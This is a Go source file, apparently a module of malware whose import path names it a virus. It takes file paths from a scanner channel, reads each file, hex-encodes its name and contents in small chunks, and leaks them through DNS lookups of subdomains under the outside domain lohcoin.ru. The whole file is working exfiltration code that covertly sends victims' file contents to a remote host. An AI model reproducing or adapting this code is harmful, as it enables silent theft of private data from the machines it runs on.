package Resolver

import (
	"os"
	"fmt"
	"encoding/hex"
	"net"
	"golang.org/x/crypto/sha3"
	"sync"
	"log"
	"bytes"
	"InfoSec/Virus/Scaner"
)

const url = "lohcoin.ru"
const bufSize = 31
const maxSubdomainLength = 63

// WG is wait group to synchronize the pool and the main routines
var Wg sync.WaitGroup

// Scan reads file paths from channel and sends it
func Scan() {
	Wg.Add(1)
	for file := range Scaner.FileNames {
		SendFile(file)
	}
	Wg.Done()
}

// SendFile opens file and sends in particular format
func SendFile(path string) error {
	buffer := make([]byte, bufSize)
	file, err := os.OpenFile(path, os.O_RDONLY, 0600)
	if err != nil {
		return err
	}
	defer file.Close()
	info, _ := file.Stat()
	prefix := sha3.Sum224([]byte(path))

	filename := info.Name()
	if len(filename) > maxSubdomainLength {
		len := len(filename)
		filename = filename[len - maxSubdomainLength: len]
		log.Println(filename)
	}

	resolve(hex.EncodeToString([]byte(filename)), prefix, 0)

	for i := uint64(1);; i++ {
		n, _ := file.Read(buffer)
		encoded := hex.EncodeToString(buffer[:n])
		resolve(encoded, prefix, i)
		if n < bufSize {
			break
		}
	}
	return nil
}


// resolve: forms host and resolves it
func resolve(content string, prefix [28]byte, part uint64) {
	host := fmt.Sprintf("%x.%063x.%s.%s", prefix, part, content, url)
	_, err := net.LookupHost(host)
	if err != nil {
		log.Println(err)
	}
}

// For future improvements and extensions
func insertNth(s string, n int, del rune) string {
	var buffer bytes.Buffer
	var len = len(s) - 1
	for i, r := range s {
		buffer.WriteRune(r)
		if i % n == n - 1 && i != len  {
			buffer.WriteRune(del)
		}
	}
	return buffer.String()
}